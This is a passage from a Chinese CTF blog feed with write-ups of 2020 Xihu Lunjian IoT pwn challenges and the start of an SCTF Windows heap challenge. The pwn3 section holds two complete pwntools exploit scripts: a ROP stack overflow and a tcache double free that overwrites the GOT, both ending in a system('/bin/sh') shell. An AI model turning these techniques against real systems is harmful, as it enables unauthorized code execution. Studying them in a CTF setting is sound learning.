img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Windows Pwn从入门到出门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win unlink </tag>
            
            <tag> win ORW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-西湖论剑-IoT闯关赛PWN方向题目复现</title>
      <link href="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/"/>
      <url>/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn1-boa"><a href="#pwn1-boa" class="headerlink" title="pwn1 boa"></a>pwn1 boa</h1><p>环境搭不起来….</p><p>漏洞倒是看到了：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/0.png"></div>这里很明显一个溢出漏洞，追溯回去看到调用这个函数的函数功能大概是身份校验<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/1.png"></div><p>由于没办法复现环境，也没有办法了。</p><h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p>这个题是个简单的协议分析题目，貌似是被非预期了，虽然环境最后还是没有搭起来，但是不妨碍进行逆向分析一下….</p><p>看看创建的进程</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/2.png"></div><p>进入handle_message：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/3.png"></div><p>进入send_loop函数之后，最重要的就是执行getAction函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/4.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/5.png"></div><p>最终会执行dump_apmib_conf函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/6.png"></div>该函数会将我们传入的a1参数作为文件名进行读取，放到一个heap中，并将heap返回。非预期解的原因就是compare_filename函数没有过滤flag名：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/7.png"></div><p>随后回到getAction函数中会将这个值进行base64加密并打印出来</p><p>那么我们想得到flag的方式就是令我们的payload要执行到最后的dump_apmib_conf函数，并将flag路径作为第一个参数。</p><p>那么根据我们的分析payload长这个样子：</p><p>payload = H4bL1b<br>payload+= len(小于0x1000)<br>payload+= p16(0x102) // 为了执行action<br>payload+= crc(可以通过已有的值进行调试计算)<br>payload+= “readFile:/flag”</p><h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/8.png"></div>看wp说是给的2.30的libc，复现的时候使用2.27吧<h2 id="IDA-分析"><a href="#IDA-分析" class="headerlink" title="IDA 分析"></a>IDA 分析</h2><p>程序一进去就有个registered函数，大概是输入用户名和密码</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/9.png"></div><p>清楚的看到有个栈溢出的漏洞。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/10.png"></div><p>modify的时候还有一个栈溢出</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/24/2020-xi-hu-lun-jian-iot-chuang-guan-sai-pwn-fang-xiang-ti-mu-fu-xian/11.png"></div>这里还有个double free<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>两个思路，第一个是利用栈溢出：</p><p>通过溢出到具有libc的栈位置，要在返回地址写入start的地址，通过菜单功能的show打印出libc基址。得到基址后再执行一次栈溢出进行ROP拿shell。其实在arm下栈溢出利用还是比较简单的，利用pop {r0, pc}指令进行布置参数和返回地址，再用一条sub  sp, fp, #4指令即可，在源程序里面就有，进行一个栈迁移。</p><p>第二个思路是double free，在tcache机制下很简单了，劫持got表，甚至快于rop。</p><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/arm-linux-gnueabi/lib/libc.so.6'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span> <span class="token string">'arm'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-arm'</span><span class="token punctuation">,</span> <span class="token string">'-g'</span><span class="token punctuation">,</span> <span class="token string">'1234'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'/usr/arm-linux-gnueabi'</span><span class="token punctuation">,</span> <span class="token string">'./pwn3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>my_id<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>my_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>my_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>my_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Please Input new password:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'continue'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please registered account \nInput your username:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input password:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input password again:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'continue ...'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xff67f2ec</span><span class="token operator">+</span><span class="token number">0xff64e000</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>pop_r0_pc <span class="token operator">=</span> libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x0011e54c</span>mov_sp_fp_4 <span class="token operator">=</span> <span class="token number">0x10f0c</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>stack_addr<span class="token operator">+</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_r0_pc<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x2c</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>stack_addr<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_sp_fp_4<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/arm-linux-gnueabi/lib/libc.so.6'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span> <span class="token string">'arm'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-arm'</span><span class="token punctuation">,</span><span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'/usr/arm-linux-gnueabi'</span><span class="token punctuation">,</span> <span class="token string">'./pwn3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>my_id<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>my_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>my_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>my_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice > '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Please Input new password:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'continue'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please registered account \nInput your username:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input password:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input password again:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'continue ...'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xff67f2ec</span><span class="token operator">+</span><span class="token number">0xff64e000</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>pop_r0_pc <span class="token operator">=</span> libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x0011e54c</span>mov_sp_fp_4 <span class="token operator">=</span> <span class="token number">0x10f0c</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x23150</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x23150</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x0022018</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"system ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ARM-PWN入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IoT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 SCTF-EasyWinHeap</title>
      <link href="/2020/12/21/sctf-2020-easywinheap/"/>
      <url>/2020/12/21/sctf-2020-easywinheap/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h1><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/0.png"></div>基本上该开启的都开起了<h1 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h1><p>标准的菜单题目：</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/1.png"></div>alloc、delete、show、edit、exit五个功能。<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/2.png"></div>这里有个UAF，删除了没清空，但是却不能向linux中的double free来利用。<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/3.png"></div>create的时候发现写了一个puts函数指针到堆中: pust | (size&gt;&gt;4)+1<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/4.png"></div>show这里还调用了在堆中的一个函数指针puts。<p>这个题放在linux中就很简单了：UAF泄露出函数指针，根据libc算出基址找到system，利用UAF来先改掉函数指针，再写入/bin/sh到堆中show出来即可。</p><h1 id="0x03-知识补充"><a href="#0x03-知识补充" class="headerlink" title="0x03 知识补充"></a>0x03 知识补充</h1><p>我们还得先把附件中的东西搞清楚：</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/5.png"></div>这里有五个附件，分别是：KERNEL.32.dll、KERNELBASE.dll、ntdll.dll、ucrtbase.dll、vcruntime140.dll五个。<p>把msvcrt.dll,msvcrxxx.dll,ucrtbase.dll当成libc.so就好。</p><p>动态链接编译可执行文件时.so/.lib文件的用处以及ELF与PE文件的区别：</p><p>编译一个动态链接的程序时，要告诉编译器：1.我们要用什么动态库。2.确定这个库里的确有目标函数</p><p>在linux里直接通过.so在编译时完成这个任务，即gcc -l，并且在运行时也用.so。而在windows中，编译时用.lib，运行时用.dll。简单的说就是windows把linux中的.so单个文件的功能拆成了两个文件来用。而且Windows的PE文件中只包含所需要的dll名字，不包含路径，则需要按照规则搜索：Dynamic-Link Library Search Order，程序当前目录也是搜索的一个环节，所以Pwn题把dll打包到程序目录也就可以理解了。</p><p>大概知道了这几个文件的作用，那么我们就得大概了解下windows heap管理机制：（来自anglyboy师傅）</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/6.png"></div><h1 id="0x04-思路"><a href="#0x04-思路" class="headerlink" title="0x04 思路"></a>0x04 思路</h1><p>第一步：通过UAF泄露heap地址，由于函数指针和malloc的heap放在一个heap中进行管理的，所以通过偏移可以找到对应heap management存放的地址</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/7.png"></div><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/21/sctf-2020-easywinheap/8.png"></div><p>这里本身就是个heap，里面分别存放puts函数指针和heap地址。</p><p>第二步：同样的利用UAF漏洞，编辑以释放的chunk的fd和bk（linux习惯了这样的叫法，在windows实际称为Flink、Blink）</p><p>对于windows 